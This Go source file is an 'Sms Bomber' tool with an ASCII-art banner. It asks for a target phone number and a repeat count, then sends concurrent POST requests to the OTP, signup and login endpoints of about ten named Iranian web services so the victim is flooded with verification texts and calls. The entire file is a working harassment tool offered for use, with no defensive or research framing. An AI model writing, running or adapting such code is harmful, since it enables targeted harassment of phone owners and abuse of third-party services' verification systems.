package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
)

type RequestStatus struct {
	URL        string
	StatusCode int
}

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- RequestStatus) {
	defer wg.Done()

	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m")
		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err)
		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		if ctx.Err() == context.Canceled {
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- RequestStatus{URL: url, StatusCode: 0}
			return
		}
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
		return
	}
	defer resp.Body.Close()

	ch <- RequestStatus{URL: url, StatusCode: resp.StatusCode}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- RequestStatus) {
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m")
		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		if ctx.Err() == context.Canceled {
			fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
			ch <- RequestStatus{URL: url, StatusCode: 0}
			return
		}
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
		return
	}
	defer resp.Body.Close()

	ch <- RequestStatus{URL: url, StatusCode: resp.StatusCode}
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*     
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")

	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	var wg sync.WaitGroup
	ch := make(chan RequestStatus, repeatCount*10)

	phoneTrimmed := strings.TrimPrefix(phone, "0")
	phoneInt64, err := strconv.ParseInt(phoneTrimmed, 10, 64)

	if err != nil {
		fmt.Println("\033[01;31m[-] Warning: Could not convert phone number to integer. Requests to APIs requiring integer format may fail.\033[0m")
	}

	for i := 0; i < repeatCount; i++ {
		wg.Add(1)
		go sendJSONRequest(ctx, "https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
			"username": phone,
		}, &wg, ch)
		wg.Add(1)
		go sendJSONRequest(ctx, "https://tap33.me/api/v2/user", map[string]interface{}{
			"phoneNumber": phone,
		}, &wg, ch)

		wg.Add(1)
		go func(ctx context.Context, url string, pInt64 int64, conversionErr error, wg *sync.WaitGroup, ch chan<- RequestStatus) {
			defer wg.Done()
			if conversionErr == nil {

				payload := map[string]interface{}{
					"mobile": pInt64,
				}
				jsonData, marshalErr := json.Marshal(payload)
				if marshalErr != nil {
					fmt.Println("\033[01;31m[-] Error while encoding JSON for", url, "!\033[0m")
					ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
					return
				}

				req, reqErr := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
				if reqErr != nil {
					fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", reqErr)
					ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
					return
				}
				req.Header.Set("Content-Type", "application/json")

				resp, clientErr := http.DefaultClient.Do(req)
				if clientErr != nil {
					if ctx.Err() == context.Canceled {
						fmt.Println("\033[01;33m[!] Request to", url, "canceled.\033[0m")
						ch <- RequestStatus{URL: url, StatusCode: 0}
						return
					}
					fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", clientErr)
					ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
					return
				}
				defer resp.Body.Close()
				ch <- RequestStatus{URL: url, StatusCode: resp.StatusCode}

			} else {
				ch <- RequestStatus{URL: url, StatusCode: http.StatusInternalServerError}
			}
		}(ctx, "https://api.nobat.ir/patient/login/phone", phoneInt64, err, &wg, ch)


		wg.Add(1)
		go sendJSONRequest(ctx, fmt.Sprintf("https://digitalsignup.snapp.ir/otp?method=sms_v2&cellphone=%v&_rsc=1hiza", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, "https://khodro45.com/api/v2/customers/otp/", map[string]interface{}{
			"mobile": phone,
		}, &wg, ch)


		wg.Add(1)
		go sendJSONRequest(ctx, "https://accounts-api.tapsi.ir/api/v1/sso-user/auth", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
			"phone": phone,
		}, &wg, ch)


		wg.Add(1)
		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
			"cellphone": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, "https://api.sibbank.ir/v1/auth/login", map[string]interface{}{
			"phone_number": phone,
		}, &wg, ch)

		wg.Add(1)
		go sendJSONRequest(ctx, "https://sandbox.sibirani.com/api/v1/developer/generator-inv-token", map[string]interface{}{
			"username": phone,
		}, &wg, ch)

	}

	go func() {
		wg.Wait()
		close(ch)
	}()

	for status := range ch {
		if status.StatusCode >= 400 || status.StatusCode == 0 {
			fmt.Printf("\033[01;31m[-] Error ! \033[0m (Status: %d)\n", status.StatusCode)
		} else {
			fmt.Printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended\033[0m (Status: %d)\n", status.StatusCode)
		}
	}
}
